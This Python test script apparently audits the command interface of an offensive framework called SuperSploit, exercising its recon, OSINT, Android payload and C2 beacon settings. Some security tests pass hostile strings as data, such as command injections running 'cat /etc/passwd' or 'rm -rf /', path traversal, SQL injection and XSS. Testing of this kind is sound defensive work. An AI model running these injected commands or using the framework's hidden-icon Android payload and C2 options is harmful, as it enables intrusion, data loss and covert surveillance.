#!/usr/bin/env python3
import subprocess
import sys
import os

# Resolve framework root directory
FRAMEWORK_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
MAIN_SCRIPT = os.path.join(FRAMEWORK_ROOT, "source/main.py")


class SuperSploitAuditor:
    def __init__(self):
        self.test_registry = []
        self.passed = 0
        self.failed = 0

    def register_test(self, name, commands, expected=None, unexpected=None):
        """Registers a new test case into the audit suite."""
        self.test_registry.append({
            "name": name,
            "commands": commands,
            "expected": expected or [],
            "unexpected": unexpected or []
        })

    def run_test(self, test):
        print(f"[*] Running Test: {test['name']}...")

        # Pre-process commands to natively resolve 'smart_use' before sending them to the pipe
        resolved_commands = []
        for cmd in test['commands']:
            if cmd.startswith("smart_use recon "):
                target = cmd.split()[-1]
                source_dir = os.path.join(FRAMEWORK_ROOT, "source")
                if source_dir not in sys.path:
                    sys.path.insert(0, source_dir)
                from core.database import DatabaseManagment
                _, allfiles = DatabaseManagment.UpdateReconDB()
                for idx, path in enumerate(allfiles):
                    if path.endswith(target):
                        resolved_commands.append("use recon " + str(idx))
                        break
                else:
                    resolved_commands.append(cmd)
            else:
                resolved_commands.append(cmd)

        # Append 'exit' to gracefully close the framework
        full_input = "\n".join(resolved_commands + ["exit", ""])
        
        # Wrapper script to safely intercept built-in input() calls.
        # This prevents EOFError when prompt_toolkit eagerly drains the stdin buffer.
        wrapper_code = f"""
import sys, builtins, runpy, os
sys.path.insert(0, os.path.dirname('{MAIN_SCRIPT}'))
orig_input = builtins.input
def fake_input(prompt=''):
    prompt_str = str(prompt).lower()
    if 'run as a module' in prompt_str or '[y/n]' in prompt_str:
        print(str(prompt) + 'y')
        return 'y'
    elif 'enter arguments for' in prompt_str:
        print(str(prompt) + '')
        return ''
    try:
        return orig_input(prompt)
    except EOFError:
        raise
builtins.input = fake_input
sys.argv = ['{MAIN_SCRIPT}']
runpy.run_path('{MAIN_SCRIPT}', run_name='__main__')
"""
        
        # Explicitly pass the source directory to PYTHONPATH.
        # This guarantees module resolution works for 'main.py' and any internal subprocesses.
        env = os.environ.copy()
        source_dir = os.path.dirname(MAIN_SCRIPT)
        env["PYTHONPATH"] = f"{source_dir}{os.pathsep}{env.get('PYTHONPATH', '')}".strip(os.pathsep)

        try:
            process = subprocess.Popen(
                [sys.executable, "-c", wrapper_code.strip()],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                cwd=FRAMEWORK_ROOT,
                env=env,
                text=True
            )
            
            # Feed commands and capture the full terminal output
            stdout, _ = process.communicate(input=full_input, timeout=30)
            
            # Failsafe in case stdout is empty
            stdout = stdout or ""
            
            # Verify Expected Strings are present in the output
            for expected in test['expected']:
                if expected.lower() not in stdout.lower():
                    print(f"    [-] FAILED: Missing expected output -> '{expected}'")
                    print("    [!] --- TERMINAL OUTPUT DUMP ---")
                    print("    " + "\n    ".join(stdout.strip().split("\n")))
                    print("    [!] ----------------------------")
                    return False
                    
            # Verify Unexpected Strings (Errors, exceptions) are NOT present
            for unexpected in test['unexpected']:
                if unexpected.lower() in stdout.lower():
                    print(f"    [-] FAILED: Found unexpected output -> '{unexpected}'")
                    print("    [!] --- TERMINAL OUTPUT DUMP ---")
                    print("    " + "\n    ".join(stdout.strip().split("\n")))
                    print("    [!] ----------------------------")
                    return False
                    
            print("    [+] PASSED")
            return True
            
        except subprocess.TimeoutExpired:
            process.kill()
            print("    [-] FAILED: Process timed out. The framework may have hung.")
            return False
        except Exception as e:
            print(f"    [-] FAILED: Exception occurred during testing: {e}")
            return False

    def audit(self):
        """Executes all registered tests sequentially."""
        print("========================================")
        print("    SuperSploit Core Command Auditor")
        print("========================================\n")
        
        if not os.path.exists(MAIN_SCRIPT):
            print(f"[!] Error: main.py not found at {MAIN_SCRIPT}")
            print("[!] Please ensure this script is located in tests/audit_core.py")
            sys.exit(1)

        try:
            for test in self.test_registry:
                if self.run_test(test):
                    self.passed += 1
                else:
                    self.failed += 1
        except KeyboardInterrupt:
            print("\n    [!] Audit interrupted by user (Ctrl+C).")
                
        print("\n========================================")
        print(f" Audit Complete: {self.passed} Passed | {self.failed} Failed")
        print("========================================")
        
        if self.failed > 0:
            sys.exit(1)


if __name__ == "__main__":
    auditor = SuperSploitAuditor()
    
    # =================================================================
    # REGISTRY OF TEST CASES
    # Easily add new core commands, edge cases, and modules here.
    # =================================================================
    
    # 1. Verify the Help Menu loads without crashing
    auditor.register_test(
        name="Core Help Menu",
        commands=["help all"],
        expected=["SUPERSPLOIT QUICK-REFERENCE"],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 2. Verify Database Variable assignments
    auditor.register_test(
        name="Set & Show Variables",
        commands=["set R_HOST 192.168.1.100", "set L_PORT 8080", "show"],
        expected=["192.168.1.100", "8080"],
        unexpected=["Traceback", "Error:"]
    )
    
    # 3. Verify the Search Engine
    auditor.register_test(
        name="Search Engine Query",
        commands=["search exploits test"],
        expected=["exploits/test/"],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 4. Verify Database additions
    auditor.register_test(
        name="Custom Variable Injection (add)",
        commands=["add CUSTOM_TEST_VAR 1337", "show"],
        expected=["CUSTOM_TEST_VAR", "1337"],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 5. Verify Native OS Shell Fallback
    auditor.register_test(
        name="Native OS Shell Fallback",
        commands=["echo 'SUPERSPLOIT_OS_FALLBACK_TEST'"],
        expected=["SUPERSPLOIT_OS_FALLBACK_TEST"],
        unexpected=["Traceback", "Exception:", "unrecognized"]
    )

    # 6. Verify Command Chaining
    auditor.register_test(
        name="Command Chaining (&&)",
        commands=["set CHAIN_VAR 777 && show CHAIN_VAR"],
        expected=["CHAIN_VAR", "777"],
        unexpected=["Traceback", "Exception:", "unrecognized"]
    )

    # 7. Verify Module Loading & Info
    auditor.register_test(
        name="Exploit Module Loading (show details)",
        commands=["search exploits", "use exploit 0", "show details"],
        expected=["Description", "Author"],
        unexpected=["Traceback", "Exception:", "out of bounds", "valid exploit first"]
    )

    # 8. Verify Payload Searching
    auditor.register_test(
        name="Payload Directory Search",
        commands=["search payloads"],
        expected=["payloads/"],
        unexpected=["Traceback", "Exception:"]
    )

    # 9. Verify Recon Searching
    auditor.register_test(
        name="Recon Directory Search",
        commands=["search recon"],
        expected=["recon/"],
        unexpected=["Traceback", "Exception:"]
    )

    # 10. Verify Edit Profile Command
    auditor.register_test(
        name="Edit Target Profile",
        commands=["edit profile \"Audit User\" email \"audit@supersploit.local\"", "show targets"],
        expected=["Audit User", "audit@supersploit.local"],
        unexpected=["Traceback", "Exception:"]
    )

    # 11. Verify Sessions List
    auditor.register_test(
        name="Sessions Manager List",
        commands=["help sessions"],
        expected=["SESSION MANAGER"],
        unexpected=["Traceback", "Exception:"]
    )

    # 12. Verify Aliases Display
    auditor.register_test(
        name="Show Aliases",
        commands=["show aliases"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 13. Verify Shells Display
    auditor.register_test(
        name="Show Available Shells",
        commands=["shells"],
        expected=["/bin/"],
        unexpected=["Traceback", "Exception:"]
    )

    # 14. Verify Suggest Command
    auditor.register_test(
        name="Exploit Suggester",
        commands=["suggest 127.0.0.1"],
        expected=["127.0.0.1"],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 15. Verify Integrate Help
    auditor.register_test(
        name="Integration Guide",
        commands=["help modules"],
        expected=["MODULE DEVELOPMENT GUIDE"],
        unexpected=["Traceback", "Exception:"]
    )

    # 16. Verify Database Dump (DebugDB)
    auditor.register_test(
        name="Debug Database Dump",
        commands=["debugdb"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 17. Verify Recon Module Loading
    auditor.register_test(
        name="Recon Module Loading",
        commands=["search recon", "use recon 0", "show details"],
        expected=["Description", "Author"],
        unexpected=["Traceback", "Exception:", "out of bounds", "valid recon first"]
    )

    # 18. Verify Payload Module Loading
    auditor.register_test(
        name="Payload Module Loading",
        commands=["search payloads", "use payload 0", "show details"],
        expected=["Description", "Author"],
        unexpected=["Traceback", "Exception:", "out of bounds", "valid payload first"]
    )

    # 19. Verify Show Options Command
    auditor.register_test(
        name="Show Module Options",
        commands=["search exploits", "use exploit 0", "show options"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 20. Verify Context Escape (Back)
    auditor.register_test(
        name="Module Context Escape",
        commands=["search exploits", "use exploit 0", "back"],
        expected=[],
        unexpected=["Traceback", "Exception:", "unrecognized"]
    )

    # 21. Verify Variable Assignment with Quotes
    auditor.register_test(
        name="Set Variable with Quotes",
        commands=["set HTTP_USER_AGENT \"Mozilla/5.0\"", "show"],
        expected=["HTTP_USER_AGENT", "Mozilla/5.0"],
        unexpected=["Traceback", "Exception:"]
    )

    # 22. Verify Help Search Command
    auditor.register_test(
        name="Help Search Command",
        commands=["help search"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 23. Verify Help Set Command
    auditor.register_test(
        name="Help Set Command",
        commands=["help set"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 24. Verify Help Add Command
    auditor.register_test(
        name="Help Add Command",
        commands=["help add"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 25. Verify Chained OS Fallback
    auditor.register_test(
        name="Command Chaining (OS Fallback)",
        commands=["echo 'CHAIN_START' && echo 'CHAIN_END'"],
        expected=["CHAIN_START", "CHAIN_END"],
        unexpected=["Traceback", "Exception:", "unrecognized"]
    )

    # 26. Verify Banner Display
    auditor.register_test(
        name="Banner Display",
        commands=["banner"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 27. Security: Path Traversal in Search
    auditor.register_test(
        name="Security: Path Traversal in Search",
        commands=["search ../../../etc/passwd"],
        expected=[],
        unexpected=["Traceback", "Exception:", "root:x:0:0"]
    )

    # 28. Security: Path Traversal in Use
    auditor.register_test(
        name="Security: Path Traversal in Use",
        commands=["use exploit ../../../etc/passwd"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 29. Security: SQL Injection Syntax in Search
    auditor.register_test(
        name="Security: SQLi Syntax in Search",
        commands=["search ' OR 1=1 --"],
        expected=[],
        unexpected=["Traceback", "Exception:", "syntax error"]
    )

    # 30. Security: Cross-Site Scripting (XSS) / HTML in Profile
    auditor.register_test(
        name="Security: HTML/XSS in Profile Edit",
        commands=["edit profile \"<script>alert(1)</script>\" email \"xss@supersploit.local\"", "show targets"],
        expected=["<script>alert(1)</script>"],
        unexpected=["Traceback", "Exception:"]
    )

    # 31. Edge Case: Extreme Length Input (Buffer Overflow Check)
    auditor.register_test(
        name="Edge Case: Buffer Overflow Check",
        commands=["set R_HOST " + "A" * 2000, "show"],
        expected=["A" * 2000],
        unexpected=["Traceback", "Exception:"]
    )

    # 32. Edge Case: Extreme Length Search
    auditor.register_test(
        name="Edge Case: Extreme Length Search",
        commands=["search " + "B" * 2000],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 33. Edge Case: Use Module Before Search
    auditor.register_test(
        name="Edge Case: Use Module Before Search",
        commands=["use exploit 0"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 34. Edge Case: Out of Bounds Module Index
    auditor.register_test(
        name="Edge Case: Out of Bounds Module Index",
        commands=["search exploits", "use exploit 99999"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 35. Edge Case: Negative Module Index
    auditor.register_test(
        name="Edge Case: Negative Module Index",
        commands=["search exploits", "use exploit -1"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 36. Edge Case: Non-Integer Module Index
    auditor.register_test(
        name="Edge Case: Non-Integer Module Index",
        commands=["search exploits", "use exploit invalid_index"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 37. Edge Case: Invalid Module Type
    auditor.register_test(
        name="Edge Case: Invalid Module Type",
        commands=["search exploits", "use invalidtype 0"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 38. Edge Case: Incomplete Set Command
    auditor.register_test(
        name="Edge Case: Incomplete Set Command",
        commands=["set R_HOST"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 39. Edge Case: Incomplete Add Command
    auditor.register_test(
        name="Edge Case: Incomplete Add Command",
        commands=["add CUSTOM_VAR"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 40. Edge Case: Unmatched Quotes
    auditor.register_test(
        name="Edge Case: Unmatched Quotes",
        commands=["set R_HOST \"192.168.1.100"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 41. Edge Case: Missing IP for Suggest
    auditor.register_test(
        name="Edge Case: Missing IP for Suggest",
        commands=["suggest"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 42. Edge Case: Invalid IP for Suggest
    auditor.register_test(
        name="Edge Case: Invalid IP for Suggest",
        commands=["suggest 999.999.999.999"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 43. Edge Case: Multiple Spaces Between Arguments
    auditor.register_test(
        name="Edge Case: Multiple Spaces in Command",
        commands=["set      R_HOST      10.0.0.1", "show"],
        expected=["10.0.0.1"],
        unexpected=["Traceback", "Exception:"]
    )

    # 44. Edge Case: Special Characters in Variable Names
    auditor.register_test(
        name="Edge Case: Special Characters in Variable",
        commands=["set R_HOST!@# 192.168.1.1", "show"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 45. Edge Case: Malformed Command Chaining
    auditor.register_test(
        name="Edge Case: Malformed Command Chaining",
        commands=["&& echo test"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 46. Edge Case: Completely Unrecognized Junk Input
    auditor.register_test(
        name="Edge Case: Unrecognized Junk Command",
        commands=["blargh_fake_command_123"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 47. Recon Module: Email OSINT
    auditor.register_test(
        name="Recon: Email OSINT Module",
        commands=["search recon email", "smart_use recon email_recon.py", "set R_HOST john.doe@gmail.com", "run"],
        expected=["Initiating OSINT analysis for email"],
        unexpected=["Traceback", "Exception:"]
    )

    # 48. Recon Module: Phone OSINT
    auditor.register_test(
        name="Recon: Phone OSINT Module",
        commands=["search recon phone", "smart_use recon phone_recon.py", "set R_HOST +14155552671", "run"],
        expected=["Initiating OSINT analysis for"],
        unexpected=["Traceback", "Exception:"]
    )

    # 49. Recon Module: Background Check
    auditor.register_test(
        name="Recon: Background Check Module",
        commands=["search recon background", "smart_use recon background_check.py", "set R_HOST \"John Doe\"", "run"],
        expected=["Initiating Profile for: John Doe"],
        unexpected=["Traceback", "Exception:"]
    )

    # 50. Recon Module: Async Port Scanner
    auditor.register_test(
        name="Recon: Async Port Scanner",
        commands=["search recon port", "smart_use recon port_scanner.py", "set R_HOST 127.0.0.1", "set PORT_RANGE 80,443", "run"],
        expected=["Starting Async Port Scan on"],
        unexpected=["Traceback", "Exception:"]
    )

    # 51. Recon Module: Network Host Discovery
    auditor.register_test(
        name="Recon: Network Host Discovery",
        commands=["search recon discovery", "smart_use recon host_discovery.py", "set R_HOST 127.0.0.1/32", "run"],
        expected=["Initiating Layer 3"],
        unexpected=["Traceback", "Exception:"]
    )

    # 52. Recon Module: Native OS Fingerprinting (Raw Sockets)
    auditor.register_test(
        name="Recon: Native OS Fingerprinting",
        commands=["search recon fingerprint", "smart_use recon os-fingerprint.py", "set R_HOST 127.0.0.1", "run"],
        expected=[],  # Might hit "Permission denied" if not running tests as root, which is acceptable
        unexpected=["Traceback", "Exception:"]
    )

    # 53. Recon Module: Nmap OS DB Lookup (Raw Sockets)
    auditor.register_test(
        name="Recon: Nmap OS DB Lookup",
        commands=["search recon nmap", "smart_use recon native-Nmap-syle-os-fingerprint.py", "set R_HOST 127.0.0.1", "set R_PORT 80", "run"],
        expected=[],  # Might hit "Permission denied" if not running tests as root, which is acceptable
        unexpected=["Traceback", "Exception:"]
    )

    # 54. Security: Sudo Command Injection in Host Discovery (R_HOST)
    auditor.register_test(
        name="Security: Discovery Sudo Command Injection",
        commands=["search recon discovery", "smart_use recon host_discovery.py", "set R_HOST 127.0.0.1; cat /etc/passwd", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:", "root:x:0:0"]
    )

    # 55. Security: Sudo Command Injection in Port Scanner (PORT_RANGE)
    auditor.register_test(
        name="Security: Port Scanner Sudo Command Injection",
        commands=["search recon port", "smart_use recon port_scanner.py", "set PORT_RANGE 80; whoami", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 56. Security: Shell Metacharacters in Email OSINT
    auditor.register_test(
        name="Security: Email OSINT Metacharacters",
        commands=["search recon email", "smart_use recon email_recon.py", "set R_HOST victim@test.com'|cat /etc/passwd", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:", "root:x:0:0"]
    )

    # 57. Security: Shell Metacharacters in Phone OSINT
    auditor.register_test(
        name="Security: Phone OSINT Metacharacters",
        commands=["search recon phone", "smart_use recon phone_recon.py", "set R_HOST +14155552671;ls -la", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 58. Security: Argument Injection in Background Check
    auditor.register_test(
        name="Security: Background Check Argument Injection",
        commands=["search recon background", "smart_use recon background_check.py", "run \"$(whoami)\" \"$(id)\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 59. Security: Environment Variable Poisoning (Sudo Leakage)
    auditor.register_test(
        name="Security: Sudo Environment Variable Poisoning",
        commands=["search recon discovery", "smart_use recon host_discovery.py", "set R_HOST $PATH", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:", "/usr/bin:/bin"]
    )

    # 60. Security: Subshell / Backgrounding Attempt
    auditor.register_test(
        name="Security: Subshell Backgrounding Attempt",
        commands=["search recon discovery", "smart_use recon host_discovery.py", "set R_HOST 127.0.0.1", "run &"],
        expected=[],
        unexpected=["Traceback", "Exception:", "unrecognized"]
    )

    # 61. Race Condition: Rapid Execution Chaining (Sudo Stress)
    auditor.register_test(
        name="Race Condition: Rapid Sudo Module Execution",
        commands=["search recon port", "smart_use recon port_scanner.py", "set R_HOST 127.0.0.1", "set PORT_RANGE 80", "run && run && run"],
        expected=[],
        unexpected=["Traceback", "Exception:", "address already in use"]
    )

    # 62. Edge Case: Buffer Stress / Massive Input on Sudo Module
    auditor.register_test(
        name="Edge Case: Sudo Module Buffer Stress",
        commands=["search recon background", "smart_use recon background_check.py", f"run \"{'A'*5000}\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 63. Edge Case: Malformed CIDR Block (Out of bounds)
    auditor.register_test(
        name="Edge Case: Discovery Malformed CIDR",
        commands=["search recon discovery", "smart_use recon host_discovery.py", "set R_HOST 127.0.0.1/999", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 64. Edge Case: Invalid Network Range in Port Scanner (/33)
    auditor.register_test(
        name="Edge Case: Port Scanner Invalid Network Range",
        commands=["search recon port", "smart_use recon port_scanner.py", "set R_HOST 127.0.0.1/33", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 65. Edge Case: Octal IP Formatting Confusion
    auditor.register_test(
        name="Edge Case: Octal IP Formatting",
        commands=["search recon port", "smart_use recon port_scanner.py", "set R_HOST 0127.0.0.1", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 66. Edge Case: IPv6 Input to IPv4/ARP Module
    auditor.register_test(
        name="Edge Case: IPv6 on IPv4 Sudo Module",
        commands=["search recon discovery", "smart_use recon host_discovery.py", "set R_HOST fe80::1", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 67. Edge Case: Invalid Port Range String
    auditor.register_test(
        name="Edge Case: Invalid Port Range String",
        commands=["search recon port", "smart_use recon port_scanner.py", "set PORT_RANGE 80-XYZ", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 68. Edge Case: Negative Port Range
    auditor.register_test(
        name="Edge Case: OS Fingerprint Negative Port",
        commands=["search recon fingerprint", "smart_use recon os-fingerprint.py", "set R_PORT -80", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 69. Edge Case: Out of Bounds Port Max
    auditor.register_test(
        name="Edge Case: OS Fingerprint Out of Bounds Port",
        commands=["search recon fingerprint", "smart_use recon os-fingerprint.py", "set R_PORT 999999", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 70. Edge Case: Unresolvable Domain Name
    auditor.register_test(
        name="Edge Case: Unresolvable Domain Target",
        commands=["search recon port", "smart_use recon port_scanner.py", "set R_HOST nonexistent.domain.supersploit.local", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 71. Edge Case: Broadcast Address Execution
    auditor.register_test(
        name="Edge Case: Discovery on Broadcast Address",
        commands=["search recon discovery", "smart_use recon host_discovery.py", "set R_HOST 255.255.255.255/32", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 72. Edge Case: Null Byte Injection
    auditor.register_test(
        name="Edge Case: Null Byte Injection",
        commands=["search recon nmap", "smart_use recon native-Nmap-syle-os-fingerprint.py", "set R_HOST 127.0.0.1\\x00", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 73. Edge Case: Missing Variables Execution
    auditor.register_test(
        name="Edge Case: Execution with Missing Target",
        commands=["search recon nmap", "smart_use recon native-Nmap-syle-os-fingerprint.py", "set R_HOST \"\"", "run"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 75. Verify Setup Command
    auditor.register_test(
        name="Setup Native C Payload Architecture",
        commands=["set APK_ARCH arm64"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 76. Verify Dynamic Variable Injection
    auditor.register_test(
        name="Set Android Payload Type",
        commands=["set ANDROID_PAYLOAD_TYPE messages", "show"],
        expected=["messages"],
        unexpected=["Traceback", "Exception:"]
    )

    # 77. Verify Configurable App Name
    auditor.register_test(
        name="Set Custom App Name",
        commands=["set APP_NAME \"System Test\"", "show"],
        expected=["System Test"],
        unexpected=["Traceback", "Exception:"]
    )

    # 78. Verify Payload Loader
    auditor.register_test(
        name="Load Payload via Session Loader",
        commands=["search payloads", "use payload 1", "load payload 1"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 79. Verify SSL/TLS C2 Configuration
    auditor.register_test(
        name="SSL/TLS Handshake Configuration",
        commands=["set L_CERT test.cert"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 80. Verify Background Execution Control
    auditor.register_test(
        name="Job Control Validation",
        commands=["bg"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 81. Edge Case: Missing Template File
    auditor.register_test(
        name="Edge Case: Missing Payload Template",
        commands=["set ANDROID_PAYLOAD_TYPE unknown_template"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 82. Edge Case: Invalid Architecture
    auditor.register_test(
        name="Edge Case: Invalid APK Architecture",
        commands=["set APK_ARCH fake_arch"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 83. Edge Case: Missing C2 Parameter
    auditor.register_test(
        name="Edge Case: Incomplete Listener Config",
        commands=["set L_PORT \"\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 84. Verify Listener Auto-Start
    auditor.register_test(
        name="Listener Auto-Start Setting",
        commands=["set LISTENER True", "show"],
        expected=["True"],
        unexpected=["Traceback", "Exception:"]
    )

    # 85. Verify New OSINT Integration
    auditor.register_test(
        name="Recon: Dork Integration Test",
        commands=["set OSINT_TARGET \"John Doe\""],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 86. Verify Webhook Result Sink
    auditor.register_test(
        name="C2: Webhook Sink Config",
        commands=["set RESULT_SINK http://webhook.local/test"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 87. Verify External Task URL
    auditor.register_test(
        name="C2: External Task URL Config",
        commands=["set EXTERNAL_TASK_URL http://pastebin.local/tasks"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 88. Verify Beacon Jitter Min
    auditor.register_test(
        name="C2: Beacon Min Sleep Config",
        commands=["set BEACON_MIN_SLEEP 10"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 89. Verify Beacon Jitter Max
    auditor.register_test(
        name="C2: Beacon Max Sleep Config",
        commands=["set BEACON_MAX_SLEEP 60"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 90. Validate Native C Source Parsing
    auditor.register_test(
        name="Session Loader: Native C Parsing",
        commands=["load test.c"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 91. Edge Case: Unreadable C Source
    auditor.register_test(
        name="Edge Case: Corrupt Native C Input",
        commands=["load /dev/null"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 92. Security: Command Injection via LHOST
    auditor.register_test(
        name="Security: LHOST Injection Check",
        commands=["set LHOST 127.0.0.1; rm -rf /"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 93. Verify Wakelock Setting
    auditor.register_test(
        name="Set Android Wakelock",
        commands=["set WAKELOCK true"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 94. Verify App Icon Hiding
    auditor.register_test(
        name="Set Android Hide Icon",
        commands=["set HIDE_ICON true"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 95. Verify Native Payload Output Customization
    auditor.register_test(
        name="Set Native Payload Output",
        commands=["set OUTPUT_NAME custom_payload.apk"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 96. Verify Workspace Isolation
    auditor.register_test(
        name="Workspace Isolation Variable",
        commands=["set WORKSPACE test_env"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 97. Verify Custom XOR Key
    auditor.register_test(
        name="Set Custom XOR Key",
        commands=["set XOR_KEY S3cr3tK3y"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 98. Verify Dev Mode Toggle
    auditor.register_test(
        name="Toggle Developer Mode",
        commands=["set DEV_MODE true"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 99. Verify Verbose Logging Toggle
    auditor.register_test(
        name="Toggle Verbose Logging",
        commands=["set VERBOSE_LOGGING true"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 100. Edge Case: Extremely Long XOR Key
    auditor.register_test(
        name="Edge Case: Extreme XOR Key",
        commands=["set XOR_KEY " + "X" * 1000],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 101. Verify Compilation Architecture Toggle
    auditor.register_test(
        name="Set Compilation Architecture",
        commands=["set COMP_ARCH x64"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 102. Verify Compilation Output Directory
    auditor.register_test(
        name="Set Compilation Output",
        commands=["set COMP_OUT /tmp/test_build"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 103. Edge Case: Invalid Compilation Architecture
    auditor.register_test(
        name="Edge Case: Invalid Compilation Arch",
        commands=["set COMP_ARCH unknown_arch"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 104. Security: Command Injection via Compilation Output
    auditor.register_test(
        name="Security: Compilation Output Injection",
        commands=["set COMP_OUT /tmp/test; whoami"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 105. Verify Terminal Emulator Override
    auditor.register_test(
        name="Terminal Emulator Override",
        commands=["set TERM_EMU xterm"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 106. Verify Exploit Cache Flush
    auditor.register_test(
        name="Exploit Cache Flush",
        commands=["update-info"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 107. Edge Case: Non-existent Terminal Emulator
    auditor.register_test(
        name="Edge Case: Invalid Terminal Emulator",
        commands=["set TERM_EMU fake_term"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 108. Security: Command Injection via Target Profile
    auditor.register_test(
        name="Security: Profile Edit Injection",
        commands=["edit profile \"Test\" name \"Test\"; ls"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )
    
    # 109. Verify Custom Nmap Probes File Path
    auditor.register_test(
        name="Set Custom Nmap Probes Path",
        commands=["set NMAP_PROBES /opt/custom/nmap-service-probes"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 110. Verify Custom OS Fingerprint DB Path
    auditor.register_test(
        name="Set Custom OS Fingerprint Path",
        commands=["set OS_FINGERPRINTS /opt/custom/nmap-os-db"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 111. Edge Case: Missing Nmap Probes File
    auditor.register_test(
        name="Edge Case: Missing Nmap Probes",
        commands=["set NMAP_PROBES /fake/path/probes"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 112. Edge Case: Invalid Jitter Values
    auditor.register_test(
        name="Edge Case: Invalid Jitter Config",
        commands=["set BEACON_MIN_SLEEP abc"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 113. Verify Thread Count Modification
    auditor.register_test(
        name="Set Thread Count",
        commands=["set THREADS 100"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 114. Verify Timeout Modification
    auditor.register_test(
        name="Set Network Timeout",
        commands=["set TIMEOUT 5.0"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 115. Edge Case: Invalid Thread Count
    auditor.register_test(
        name="Edge Case: Invalid Thread Config",
        commands=["set THREADS max"],
        expected=[],
        unexpected=["Traceback", "Exception:"]
    )

    # 116. Verify Cross-Compilation Detection
    auditor.register_test(
        name="Session Loader: Linux Cross-Compilation",
        commands=["search exploits", "use exploit 1", "load payload 1"],
        expected=[],
